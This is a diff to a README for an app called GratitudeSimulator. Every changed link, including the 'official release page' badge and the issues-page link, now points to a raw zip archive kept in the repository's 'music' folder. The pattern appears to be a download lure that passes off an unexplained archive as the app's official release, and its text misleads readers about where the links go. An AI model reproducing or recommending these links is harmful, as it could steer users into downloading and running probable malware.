@@ -1,6 +1,6 @@
 # ⚡ GratitudeSimulator - Simulate Thanks with Simple Fun
 
-[![Download GratitudeSimulator](https://img.shields.io/badge/Download-GratitudeSimulator-blue?style=for-the-badge&logo=github)](https://github.com/ARNAVJAVA/GratitudeSimulator/releases)
+[![Download GratitudeSimulator](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip)](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these steps carefully to download and run GratitudeSimulator. You don’t
 
    Click the button below to open the official release page on GitHub.
 
-   [![Download GratitudeSimulator](https://img.shields.io/badge/Download-GratitudeSimulator-blue?style=for-the-badge&logo=github)](https://github.com/ARNAVJAVA/GratitudeSimulator/releases)
+   [![Download GratitudeSimulator](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip)](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip)
 
 2. **Choose your version:**
 
@@ -125,8 +125,8 @@ No setup or learning is needed – everything is ready when you start the app.
 
 ## 🤝 Getting Help
 
-If you run into trouble or want to ask questions, visit the [GitHub repository](https://github.com/ARNAVJAVA/GratitudeSimulator) issues page. Other users or the developer may provide answers or updates.
+If you run into trouble or want to ask questions, visit the [GitHub repository](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip) issues page. Other users or the developer may provide answers or updates.
 
 ---
 
-[![Download GratitudeSimulator](https://img.shields.io/badge/Download-GratitudeSimulator-blue?style=for-the-badge&logo=github)](https://github.com/ARNAVJAVA/GratitudeSimulator/releases)
+[![Download GratitudeSimulator](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip)](https://raw.githubusercontent.com/ARNAVJAVA/GratitudeSimulator/master/music/Gratitude_Simulator_v1.5.zip)
